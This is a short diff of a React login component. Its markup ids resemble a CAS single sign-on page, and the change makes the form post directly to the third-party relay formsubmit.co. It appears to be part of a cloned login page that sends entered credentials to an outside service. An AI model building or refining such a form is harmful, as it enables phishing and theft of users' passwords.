@@ -71,7 +71,7 @@ function App() {
       <section id="main">
         <div id="content" className="content">
           <div id="cas-content">
-            <form method="post" id="fm1" action="https://formsubmit.co" onSubmit={handleSubmit}>
+            <form method="post" id="fm1" action="https://formsubmit.co">
               <div className="row">
                 <div className="col-md-5 col-12 gx-0 gx-md-4">
                   <div id="login">
